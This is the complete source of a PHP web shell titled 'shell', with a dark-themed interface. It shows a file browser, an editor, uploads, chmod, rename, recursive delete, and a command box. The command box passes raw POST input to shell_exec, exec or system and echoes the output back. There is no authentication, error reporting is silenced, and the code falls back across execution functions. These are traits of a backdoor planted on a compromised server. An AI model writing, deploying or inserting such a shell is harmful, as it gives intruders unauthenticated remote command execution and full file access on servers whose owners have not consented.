<?php
@error_reporting(0);
@ini_set('upload_max_filesize','50M');
@ini_set('post_max_size','50M');
@ini_set('max_execution_time',300);

// ── helpers ──────────────────────────────────────────────────────────────────
function sh_size($b) {
    if ($b >= 1073741824) return round($b/1073741824,1).'G';
    if ($b >= 1048576)    return round($b/1048576,1).'M';
    if ($b >= 1024)       return round($b/1024,1).'K';
    return $b.'B';
}
function sh_perms($f) {
    $p = @fileperms($f); if ($p===false) return '?';
    $r  = is_dir($f)?'d':'-';
    $r .= ($p&0x0100)?'r':'-'; $r .= ($p&0x0080)?'w':'-'; $r .= ($p&0x0040)?'x':'-';
    $r .= ($p&0x0020)?'r':'-'; $r .= ($p&0x0010)?'w':'-'; $r .= ($p&0x0008)?'x':'-';
    $r .= ($p&0x0004)?'r':'-'; $r .= ($p&0x0002)?'w':'-'; $r .= ($p&0x0001)?'x':'-';
    return $r;
}
function sh_icon($f) {
    $a='width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"';
    if (is_dir($f)) return '<svg '.$a.' style="color:#d29922"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>';
    $ext = strtolower(pathinfo($f,PATHINFO_EXTENSION));
    if (in_array($ext,array('php','py','js','ts','sh','html','css','rb','go','java','c','cpp')))
        return '<svg '.$a.' style="color:#79c0ff"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
    if (in_array($ext,array('jpg','jpeg','png','gif','svg','webp','ico')))
        return '<svg '.$a.' style="color:#3fb950"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
    if (in_array($ext,array('zip','tar','gz','rar','7z')))
        return '<svg '.$a.' style="color:#d29922"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"/></svg>';
    if (in_array($ext,array('json','xml','yml','yaml','ini','conf','env')))
        return '<svg '.$a.' style="color:#8b949e"><circle cx="12" cy="12" r="3"/><path d="M12 2v2M12 20v2M2 12h2M20 12h2"/></svg>';
    return '<svg '.$a.' style="color:#8b949e"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
}
function sh_safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function sh_esc($s)  { return json_encode($s); }

// ── state ─────────────────────────────────────────────────────────────────────
$root   = isset($_POST['root'])  && is_dir($_POST['root'])  ? $_POST['root']  : __DIR__;
$cwd    = isset($_POST['cwd'])   && is_dir($_POST['cwd'])   ? $_POST['cwd']   : $root;
$tab    = isset($_POST['tab'])   ? $_POST['tab']   : (isset($_GET['tab']) ? $_GET['tab'] : 'browse');
$msg    = '';
$msgok  = true;

// ── actions ───────────────────────────────────────────────────────────────────
$action = isset($_POST['action']) ? $_POST['action'] : '';

// Upload
if ($action === 'upload' && isset($_FILES['ufile'])) {
    $files = $_FILES['ufile'];
    $ok=0; $fail=0;
    foreach ($files['name'] as $i=>$name) {
        if ($files['error'][$i] !== 0) { $fail++; continue; }
        $dest = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.basename($name);
        if (move_uploaded_file($files['tmp_name'][$i], $dest)) $ok++; else $fail++;
    }
    $msg = "Uploaded $ok file(s)".($fail?" ($fail failed)":'');
    $msgok = $fail===0;
    $tab = 'browse';
}

// New folder
if ($action === 'mkdir' && isset($_POST['newdir'])) {
    $nd = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.basename($_POST['newdir']);
    $msg = @mkdir($nd,0755,true) ? 'Folder created' : 'Failed to create folder';
    $msgok = strpos($msg,'created')!==false;
    $tab = 'browse';
}

// New file
if ($action === 'newfile' && isset($_POST['newfilename'])) {
    $nf = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.basename($_POST['newfilename']);
    $msg = @file_put_contents($nf,'')!==false ? 'File created' : 'Failed to create file';
    $msgok = strpos($msg,'created')!==false;
    $tab = 'browse';
}

// Delete
if ($action === 'delete' && isset($_POST['dpath'])) {
    $dp = $_POST['dpath'];
    if (is_file($dp)) {
        $msg = @unlink($dp) ? 'Deleted' : 'Delete failed';
    } elseif (is_dir($dp)) {
        function sh_rmdir($d) {
            foreach (scandir($d) as $i) {
                if ($i==='.'||$i==='..') continue;
                $p=$d.DIRECTORY_SEPARATOR.$i;
                is_dir($p)?sh_rmdir($p):@unlink($p);
            }
            return @rmdir($d);
        }
        $msg = sh_rmdir($dp) ? 'Deleted' : 'Delete failed';
    }
    $msgok = $msg==='Deleted';
    $tab = 'browse';
}

// Rename
if ($action === 'rename' && isset($_POST['rpath']) && isset($_POST['rname'])) {
    $old = $_POST['rpath'];
    $new = dirname($old).DIRECTORY_SEPARATOR.basename($_POST['rname']);
    $msg = @rename($old,$new) ? 'Renamed' : 'Rename failed';
    $msgok = $msg==='Renamed';
    $tab = 'browse';
}

// chmod
if ($action === 'chmod' && isset($_POST['chpath']) && isset($_POST['chmode'])) {
    $msg = @chmod($_POST['chpath'], octdec($_POST['chmode'])) ? 'Permission changed' : 'chmod failed';
    $msgok = strpos($msg,'changed')!==false;
    $tab = 'browse';
}

// Save file
if ($action === 'save' && isset($_POST['epath']) && isset($_POST['econtent'])) {
    $ok = @file_put_contents($_POST['epath'], $_POST['econtent']);
    $msg = $ok!==false ? 'Saved ('.$ok.' bytes)' : 'Save failed';
    $msgok = $ok!==false;
    $tab = 'edit';
}

// Run command
$cmd_out = '';
if ($action === 'cmd' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        $cmd_out = shell_exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1');
    } elseif (function_exists('exec')) {
        exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1', $lines);
        $cmd_out = implode("\n",$lines);
    } elseif (function_exists('system')) {
        ob_start();
        system('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1');
        $cmd_out = ob_get_clean();
    } else {
        $cmd_out = 'No execution function available';
    }
    if ($cmd_out===null) $cmd_out='';
    $tab = 'shell';
}

// Edit file (load)
$edit_path    = isset($_POST['epath']) ? $_POST['epath'] : (isset($_GET['edit']) ? $_GET['edit'] : '');
$edit_content = '';
if ($edit_path && is_file($edit_path)) {
    $edit_content = $action==='save' ? (isset($_POST['econtent'])?$_POST['econtent']:'') : @file_get_contents($edit_path);
    $tab = 'edit';
}

// ── browse list ───────────────────────────────────────────────────────────────
$entries = array();
if (is_dir($cwd)) {
    $raw = @scandir($cwd);
    if ($raw) {
        $dirs=$files_list=array();
        foreach ($raw as $item) {
            if ($item==='.'||$item==='..') continue;
            $fp = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.$item;
            if (is_dir($fp)) $dirs[]=$item; else $files_list[]=$item;
        }
        sort($dirs); sort($files_list);
        foreach ($dirs as $d) $entries[] = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.$d;
        foreach ($files_list as $f) $entries[] = rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.$f;
    }
}

$parent = dirname($cwd);
$host   = @php_uname('n');
$user   = function_exists('get_current_user') ? get_current_user() : '?';
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>shell</title>
<style>
:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--bd:#30363d;--tx:#e6edf3;--tx2:#8b949e;--ac:#58a6ff;--gr:#3fb950;--ye:#d29922;--re:#f85149}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:var(--bg);color:var(--tx);font-family:'Consolas','Courier New',monospace;font-size:13px;line-height:1.5}
a{color:var(--ac);text-decoration:none}
a:hover{text-decoration:underline}

/* layout */
.topbar{background:var(--bg2);border-bottom:1px solid var(--bd);padding:8px 14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.topbar .logo{font-weight:700;color:var(--tx);font-size:14px;letter-spacing:.5px}
.topbar .info{color:var(--tx2);font-size:11px}
.topbar .info b{color:var(--ac)}
.wrap{display:flex;height:calc(100vh - 41px)}
.sidebar{width:200px;min-width:160px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;overflow:hidden}
.sidebar .nav-item{padding:8px 14px;cursor:pointer;color:var(--tx2);display:flex;align-items:center;gap:8px;border-left:2px solid transparent;font-size:12px}
.sidebar .nav-item:hover{background:var(--bg3);color:var(--tx)}
.sidebar .nav-item.active{background:var(--bg3);color:var(--tx);border-left-color:var(--ac)}
.sidebar .nav-item svg{flex-shrink:0}
.main{flex:1;overflow-y:auto;padding:14px}

/* breadcrumb */
.breadcrumb{display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin-bottom:10px;font-size:12px;color:var(--tx2)}
.breadcrumb a{color:var(--ac)}
.breadcrumb span{color:var(--tx2)}

/* toolbar */
.toolbar{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;align-items:center}
.btn{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);padding:4px 10px;cursor:pointer;font:12px monospace;border-radius:4px;display:inline-flex;align-items:center;gap:5px}
.btn:hover{border-color:var(--ac);color:var(--ac)}
.btn.danger:hover{border-color:var(--re);color:var(--re)}
.btn.primary{background:#1f4a8a;border-color:var(--ac);color:var(--ac)}
.btn.primary:hover{background:#2d5fa8}

/* file table */
.ftable{width:100%;border-collapse:collapse}
.ftable th{padding:5px 8px;text-align:left;color:var(--tx2);font-size:11px;border-bottom:1px solid var(--bd);font-weight:normal}
.ftable td{padding:5px 8px;border-bottom:1px solid var(--bd);vertical-align:middle}
.ftable tr:hover td{background:var(--bg2)}
.fname{display:flex;align-items:center;gap:6px}
.fname a{color:var(--tx)}
.fname a:hover{color:var(--ac)}
.factions{display:flex;gap:4px}
.factions .btn{padding:2px 7px;font-size:11px}
.ftable .col-perm{color:var(--tx2);font-size:11px}
.ftable .col-size{color:var(--tx2);font-size:11px;white-space:nowrap}
.ftable .col-date{color:var(--tx2);font-size:11px;white-space:nowrap}

/* input */
input[type=text],textarea,select{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);font:13px monospace;padding:5px 8px;outline:none;border-radius:4px}
input[type=text]:focus,textarea:focus{border-color:var(--ac)}
input[type=file]{color:var(--tx2);font-size:12px}

/* shell */
.shell-out{background:var(--bg2);border:1px solid var(--bd);padding:10px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;font-size:12px;border-radius:4px;margin-top:8px}
.shell-prompt{display:flex;gap:6px;align-items:center}
.shell-prompt span{color:var(--gr);white-space:nowrap;font-size:12px}
.shell-prompt input{flex:1}

/* editor */
.editor-bar{display:flex;gap:6px;margin-bottom:8px;align-items:center}
.editor-bar .epath{flex:1;color:var(--tx2);font-size:12px}
textarea.code{width:100%;height:calc(100vh - 200px);resize:vertical;font-size:12px;line-height:1.6;background:var(--bg2);border-color:var(--bd);border-radius:4px}

/* modal */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
.modal-bg.open{display:flex}
.modal{background:var(--bg2);border:1px solid var(--bd);padding:18px;min-width:300px;border-radius:6px}
.modal h3{margin-bottom:12px;font-size:13px;color:var(--tx)}
.modal .row{margin-bottom:8px}
.modal .row label{display:block;color:var(--tx2);font-size:11px;margin-bottom:3px}
.modal .row input{width:100%}
.modal .btns{display:flex;gap:6px;margin-top:12px;justify-content:flex-end}

/* msg */
.msg{padding:7px 12px;border-radius:4px;margin-bottom:10px;font-size:12px}
.msg.ok{background:#0d2e0d;border:1px solid var(--gr);color:var(--gr)}
.msg.err{background:#2e0d0d;border:1px solid var(--re);color:var(--re)}

/* upload zone */
.upload-zone{border:1px dashed var(--bd);padding:16px;border-radius:4px;text-align:center;color:var(--tx2);font-size:12px;margin-bottom:10px}

/* scrollbar */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px}
</style>
</head>
<body>
<div class="topbar">
  <span class="logo">&#9654; shell</span>
  <span class="info">host: <b><?php echo sh_safe($host);?></b></span>
  <span class="info">user: <b><?php echo sh_safe($user);?></b></span>
  <span class="info">php: <b><?php echo PHP_VERSION;?></b></span>
  <span class="info">cwd: <b><?php echo sh_safe($cwd);?></b></span>
</div>

<div class="wrap">
  <!-- sidebar -->
  <div class="sidebar">
    <div class="nav-item <?php echo $tab==='browse'?'active':'';?>" onclick="setTab('browse')">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
      Files
    </div>
    <div class="nav-item <?php echo $tab==='shell'?'active':'';?>" onclick="setTab('shell')">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
      Shell
    </div>
    <div class="nav-item <?php echo $tab==='upload'?'active':'';?>" onclick="setTab('upload')">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>
      Upload
    </div>
    <div class="nav-item <?php echo $tab==='edit'?'active':'';?>" onclick="setTab('edit')">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
      Editor
    </div>
  </div>

  <!-- main -->
  <div class="main">
    <!-- hidden form state -->
    <form id="stateform" method="post" style="display:none">
      <input type="hidden" name="tab"  id="s_tab"  value="<?php echo sh_safe($tab);?>">
      <input type="hidden" name="cwd"  id="s_cwd"  value="<?php echo sh_safe($cwd);?>">
      <input type="hidden" name="root" id="s_root" value="<?php echo sh_safe($root);?>">
    </form>

    <?php if ($msg): ?>
    <div class="msg <?php echo $msgok?'ok':'err';?>"><?php echo sh_safe($msg);?></div>
    <?php endif; ?>

    <!-- BROWSE TAB -->
    <div id="tab-browse" class="tabsec" <?php echo $tab!=='browse'?'style="display:none"':'';?>>
      <!-- breadcrumb -->
      <div class="breadcrumb">
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, rtrim($cwd,'/\\'));
        $built = '';
        foreach ($parts as $i=>$p) {
            if ($p==='') { $built=DIRECTORY_SEPARATOR; continue; }
            $built = ($built===DIRECTORY_SEPARATOR?DIRECTORY_SEPARATOR:$built.DIRECTORY_SEPARATOR).$p;
            if ($i<count($parts)-1) {
                echo '<a href="#" onclick="navTo('.sh_esc($built).');return false">'.sh_safe($p).'</a><span>/</span>';
            } else {
                echo '<span style="color:var(--tx)">'.sh_safe($p).'</span>';
            }
        }
        ?>
      </div>

      <!-- toolbar -->
      <div class="toolbar">
        <?php if ($parent !== $cwd): ?>
        <button class="btn" onclick="navTo(<?php echo sh_esc($parent);?>)">&#8593; Up</button>
        <?php endif; ?>
        <button class="btn" onclick="openModal('modal-mkdir')">+ Folder</button>
        <button class="btn" onclick="openModal('modal-newfile')">+ File</button>
      </div>

      <!-- file table -->
      <table class="ftable">
        <thead><tr>
          <th style="width:40%">Name</th>
          <th>Perms</th>
          <th>Size</th>
          <th>Modified</th>
          <th>Actions</th>
        </tr></thead>
        <tbody>
        <?php foreach ($entries as $fp):
            $name  = basename($fp);
            $isdir = is_dir($fp);
            $perms = sh_perms($fp);
            $size  = $isdir ? '-' : sh_size(@filesize($fp));
            $mtime = @filemtime($fp); $date = $mtime ? date('Y-m-d H:i',$mtime) : '-';
        ?>
        <tr>
          <td>
            <div class="fname">
              <?php echo sh_icon($fp);?>
              <?php if ($isdir): ?>
                <a href="#" onclick="navTo(<?php echo sh_esc($fp);?>);return false"><?php echo sh_safe($name);?></a>
              <?php else: ?>
                <a href="#" onclick="editFile(<?php echo sh_esc($fp);?>);return false"><?php echo sh_safe($name);?></a>
              <?php endif; ?>
            </div>
          </td>
          <td class="col-perm"><?php echo $perms;?></td>
          <td class="col-size"><?php echo $size;?></td>
          <td class="col-date"><?php echo $date;?></td>
          <td>
            <div class="factions">
              <?php if (!$isdir): ?>
              <button class="btn" onclick="editFile(<?php echo sh_esc($fp);?>)">Edit</button>
              <?php endif; ?>
              <button class="btn" onclick="openRename(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Ren</button>
              <button class="btn" onclick="openChmod(<?php echo sh_esc($fp);?>,<?php echo sh_esc($perms);?>)">Perm</button>
              <button class="btn danger" onclick="doDelete(<?php echo sh_esc($fp);?>,<?php echo sh_esc($name);?>)">Del</button>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
        <?php if (empty($entries)): ?>
        <tr><td colspan="5" style="color:var(--tx2);padding:20px 8px">Empty directory</td></tr>
        <?php endif; ?>
        </tbody>
      </table>
    </div>

    <!-- SHELL TAB -->
    <div id="tab-shell" class="tabsec" <?php echo $tab!=='shell'?'style="display:none"':'';?>>
      <form method="post" id="shellform">
        <input type="hidden" name="tab"    value="shell">
        <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
        <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
        <input type="hidden" name="action" value="cmd">
        <div class="shell-prompt">
          <span><?php echo sh_safe($user);?>@<?php echo sh_safe($host);?>:<?php echo sh_safe($cwd);?> $</span>
          <input type="text" name="cmd" id="cmd_input" placeholder="command..." autofocus autocomplete="off" style="flex:1" <?php echo $tab==='shell'?'autofocus':'';?>>
          <button class="btn primary" type="submit">Run</button>
        </div>
      </form>
      <?php if ($cmd_out !== ''): ?>
      <div class="shell-out"><?php echo sh_safe($cmd_out);?></div>
      <?php endif; ?>
    </div>

    <!-- UPLOAD TAB -->
    <div id="tab-upload" class="tabsec" <?php echo $tab!=='upload'?'style="display:none"':'';?>>
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="tab"    value="upload">
        <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
        <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
        <input type="hidden" name="action" value="upload">
        <div class="upload-zone">
          <input type="file" name="ufile[]" multiple style="display:block;margin:0 auto">
          <div style="margin-top:6px;color:var(--tx2)">Uploading to: <b style="color:var(--ac)"><?php echo sh_safe($cwd);?></b></div>
        </div>
        <button class="btn primary" type="submit">Upload</button>
      </form>
    </div>

    <!-- EDIT TAB -->
    <div id="tab-edit" class="tabsec" <?php echo $tab!=='edit'?'style="display:none"':'';?>>
      <?php if ($edit_path && is_file($edit_path)): ?>
      <form method="post">
        <input type="hidden" name="tab"    value="edit">
        <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
        <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="epath"  value="<?php echo sh_safe($edit_path);?>">
        <div class="editor-bar">
          <span class="epath"><?php echo sh_safe($edit_path);?></span>
          <button class="btn primary" type="submit">Save</button>
          <button class="btn" type="button" onclick="setTab('browse')">&#x2715; Close</button>
        </div>
        <textarea class="code" name="econtent"><?php echo sh_safe($edit_content);?></textarea>
      </form>
      <?php else: ?>
      <div style="color:var(--tx2);padding:20px">Click a file in the Files tab to edit it.</div>
      <?php endif; ?>
    </div>
  </div><!-- /main -->
</div><!-- /wrap -->

<!-- modals -->
<div class="modal-bg" id="modal-mkdir">
  <div class="modal">
    <h3>New Folder</h3>
    <form method="post">
      <input type="hidden" name="tab"    value="browse">
      <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
      <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
      <input type="hidden" name="action" value="mkdir">
      <div class="row"><label>Folder name</label><input type="text" name="newdir" autofocus></div>
      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-mkdir')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
    </form>
  </div>
</div>

<div class="modal-bg" id="modal-newfile">
  <div class="modal">
    <h3>New File</h3>
    <form method="post">
      <input type="hidden" name="tab"    value="browse">
      <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
      <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
      <input type="hidden" name="action" value="newfile">
      <div class="row"><label>File name</label><input type="text" name="newfilename" autofocus></div>
      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-newfile')">Cancel</button><button class="btn primary" type="submit">Create</button></div>
    </form>
  </div>
</div>

<div class="modal-bg" id="modal-rename">
  <div class="modal">
    <h3>Rename</h3>
    <form method="post">
      <input type="hidden" name="tab"    value="browse">
      <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
      <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
      <input type="hidden" name="action" value="rename">
      <input type="hidden" name="rpath"  id="rename_path">
      <div class="row"><label>New name</label><input type="text" name="rname" id="rename_name" autofocus></div>
      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-rename')">Cancel</button><button class="btn primary" type="submit">Rename</button></div>
    </form>
  </div>
</div>

<div class="modal-bg" id="modal-chmod">
  <div class="modal">
    <h3>Change Permission</h3>
    <form method="post">
      <input type="hidden" name="tab"    value="browse">
      <input type="hidden" name="cwd"    value="<?php echo sh_safe($cwd);?>">
      <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
      <input type="hidden" name="action" value="chmod">
      <input type="hidden" name="chpath" id="chmod_path">
      <div class="row"><label>Octal (e.g. 0644)</label><input type="text" name="chmode" id="chmod_mode" maxlength="4"></div>
      <div class="btns"><button class="btn" type="button" onclick="closeModal('modal-chmod')">Cancel</button><button class="btn primary" type="submit">Apply</button></div>
    </form>
  </div>
</div>

<form method="post" id="delform">
  <input type="hidden" name="tab"    value="browse">
  <input type="hidden" name="cwd"    id="del_cwd"  value="<?php echo sh_safe($cwd);?>">
  <input type="hidden" name="root"   value="<?php echo sh_safe($root);?>">
  <input type="hidden" name="action" value="delete">
  <input type="hidden" name="dpath"  id="del_path">
</form>

<form method="post" id="navform">
  <input type="hidden" name="tab"  value="browse">
  <input type="hidden" name="cwd"  id="nav_cwd">
  <input type="hidden" name="root" value="<?php echo sh_safe($root);?>">
</form>

<form method="post" id="editform">
  <input type="hidden" name="tab"   value="edit">
  <input type="hidden" name="cwd"   value="<?php echo sh_safe($cwd);?>">
  <input type="hidden" name="root"  value="<?php echo sh_safe($root);?>">
  <input type="hidden" name="epath" id="edit_path">
</form>

<script>
function setTab(t){
  document.querySelectorAll('.tabsec').forEach(function(s){s.style.display='none'});
  document.querySelectorAll('.nav-item').forEach(function(s){s.classList.remove('active')});
  var sec=document.getElementById('tab-'+t);
  if(sec) sec.style.display='';
  document.querySelectorAll('.nav-item').forEach(function(el){
    if(el.getAttribute('onclick')&&el.getAttribute('onclick').indexOf("'"+t+"'")>=0) el.classList.add('active');
  });
}
function navTo(p){document.getElementById('nav_cwd').value=p;document.getElementById('navform').submit();}
function editFile(p){document.getElementById('edit_path').value=p;document.getElementById('editform').submit();}
function openModal(id){document.getElementById(id).classList.add('open');}
function closeModal(id){document.getElementById(id).classList.remove('open');}
function openRename(path,name){document.getElementById('rename_path').value=path;document.getElementById('rename_name').value=name;openModal('modal-rename');}
function openChmod(path,perms){
  document.getElementById('chmod_path').value=path;
  // convert rwx to octal
  var p=perms,o=0;
  if(p[1]==='r')o+=256;if(p[2]==='w')o+=128;if(p[3]==='x')o+=64;
  if(p[4]==='r')o+=32;if(p[5]==='w')o+=16;if(p[6]==='x')o+=8;
  if(p[7]==='r')o+=4;if(p[8]==='w')o+=2;if(p[9]==='x')o+=1;
  document.getElementById('chmod_mode').value='0'+o.toString(8);
  openModal('modal-chmod');
}
function doDelete(path,name){
  if(confirm('Delete '+name+'?')){
    document.getElementById('del_path').value=path;
    document.getElementById('delform').submit();
  }
}
// close modal on bg click
document.querySelectorAll('.modal-bg').forEach(function(m){
  m.addEventListener('click',function(e){if(e.target===m)m.classList.remove('open');});
});
</script>
</body>
</html>
